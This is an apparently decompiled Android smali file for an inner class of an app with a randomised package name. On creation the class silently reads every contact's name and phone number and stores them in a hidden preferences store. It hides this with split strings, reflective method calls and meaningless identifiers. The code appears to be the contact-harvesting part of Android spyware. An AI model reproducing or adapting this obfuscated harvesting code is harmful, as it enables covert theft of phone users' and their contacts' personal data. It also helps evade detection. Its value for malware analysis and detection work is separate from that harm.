.class Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$2;
.super Ljava/lang/Object;
.source "DragonWaer.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;


# direct methods
.method constructor <init>(Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$2;->this$0:Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;

    .line 200
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 20

    .prologue
    .line 202
    :try_start_0
    move-object/from16 v0, p0

    iget-object v3, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$2;->this$0:Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;

    invoke-virtual {v3}, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    .line 203
    .local v2, "cr":Landroid/content/ContentResolver;
    sget-object v3, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    .line 204
    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    .line 203
    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v9

    .line 205
    .local v9, "cur":Landroid/database/Cursor;
    const-string v18, ""

    .line 206
    .local v18, "strout":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v3, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$2;->this$0:Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;

    invoke-virtual {v3}, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    sget-object v4, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v15

    .line 207
    .local v15, "phones":Landroid/database/Cursor;
    :goto_0
    invoke-interface {v15}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-nez v3, :cond_0

    .line 214
    invoke-interface {v15}, Landroid/database/Cursor;->close()V

    .line 216
    const-string v10, "ste"

    .line 217
    .local v10, "dfd":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v3, v0, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer$2;->this$0:Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "sy"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "ma"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {v3, v4, v5}, Llb/iuattiylwr/pcjlwvqooxy/DragonWaer;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v19

    .line 218
    .local v19, "userDetails":Landroid/content/SharedPreferences;
    new-instance v17, Llb/iuattiylwr/pcjlwvqooxy/Pirat;

    move-object/from16 v0, v17

    move-object/from16 v1, v19

    invoke-direct {v0, v1}, Llb/iuattiylwr/pcjlwvqooxy/Pirat;-><init>(Landroid/content/SharedPreferences;)V

    .line 219
    .local v17, "rtrtr":Llb/iuattiylwr/pcjlwvqooxy/Pirat;
    invoke-virtual/range {v17 .. v17}, Llb/iuattiylwr/pcjlwvqooxy/Pirat;->gett()Landroid/content/SharedPreferences$Editor;

    move-result-object v12

    .line 220
    .local v12, "editor":Landroid/content/SharedPreferences$Editor;
    new-instance v16, Llb/iuattiylwr/pcjlwvqooxy/PiratusKa;

    invoke-direct/range {v16 .. v16}, Llb/iuattiylwr/pcjlwvqooxy/PiratusKa;-><init>()V

    .line 221
    .local v16, "putt":Llb/iuattiylwr/pcjlwvqooxy/PiratusKa;
    const-string v3, "putString"

    const-string v4, "contacts"

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "\r\n "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v18

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    move-object/from16 v0, v16

    invoke-virtual {v0, v12, v3, v4, v5}, Llb/iuattiylwr/pcjlwvqooxy/PiratusKa;->runus(Landroid/content/SharedPreferences$Editor;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 224
    const-string v11, "ppl"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 226
    .local v11, "dfdsfsd":Ljava/lang/String;
    :try_start_1
    const-string v3, "android.content.SharedPreferences$Editor"

    invoke-static {v3}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "a"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "y"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {v3, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v3, v12, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 235
    .end local v2    # "cr":Landroid/content/ContentResolver;
    .end local v9    # "cur":Landroid/database/Cursor;
    .end local v10    # "dfd":Ljava/lang/String;
    .end local v11    # "dfdsfsd":Ljava/lang/String;
    .end local v12    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v15    # "phones":Landroid/database/Cursor;
    .end local v16    # "putt":Llb/iuattiylwr/pcjlwvqooxy/PiratusKa;
    .end local v17    # "rtrtr":Llb/iuattiylwr/pcjlwvqooxy/Pirat;
    .end local v18    # "strout":Ljava/lang/String;
    .end local v19    # "userDetails":Landroid/content/SharedPreferences;
    :goto_1
    return-void

    .line 209
    .restart local v2    # "cr":Landroid/content/ContentResolver;
    .restart local v9    # "cur":Landroid/database/Cursor;
    .restart local v15    # "phones":Landroid/database/Cursor;
    .restart local v18    # "strout":Ljava/lang/String;
    :cond_0
    :try_start_2
    const-string v3, "display_name"

    invoke-interface {v15, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v15, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v13

    .line 210
    .local v13, "name":Ljava/lang/String;
    const-string v3, "data1"

    invoke-interface {v15, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v15, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v14

    .line 212
    .local v14, "phoneNumber":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "\r\n"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "\r\n"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "\r\n"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    move-result-object v18

    goto/16 :goto_0

    .line 232
    .end local v2    # "cr":Landroid/content/ContentResolver;
    .end local v9    # "cur":Landroid/database/Cursor;
    .end local v13    # "name":Ljava/lang/String;
    .end local v14    # "phoneNumber":Ljava/lang/String;
    .end local v15    # "phones":Landroid/database/Cursor;
    .end local v18    # "strout":Ljava/lang/String;
    :catch_0
    move-exception v3

    goto :goto_1

    .line 228
    .restart local v2    # "cr":Landroid/content/ContentResolver;
    .restart local v9    # "cur":Landroid/database/Cursor;
    .restart local v10    # "dfd":Ljava/lang/String;
    .restart local v11    # "dfdsfsd":Ljava/lang/String;
    .restart local v12    # "editor":Landroid/content/SharedPreferences$Editor;
    .restart local v15    # "phones":Landroid/database/Cursor;
    .restart local v16    # "putt":Llb/iuattiylwr/pcjlwvqooxy/PiratusKa;
    .restart local v17    # "rtrtr":Llb/iuattiylwr/pcjlwvqooxy/Pirat;
    .restart local v18    # "strout":Ljava/lang/String;
    .restart local v19    # "userDetails":Landroid/content/SharedPreferences;
    :catch_1
    move-exception v3

    goto :goto_1
.end method
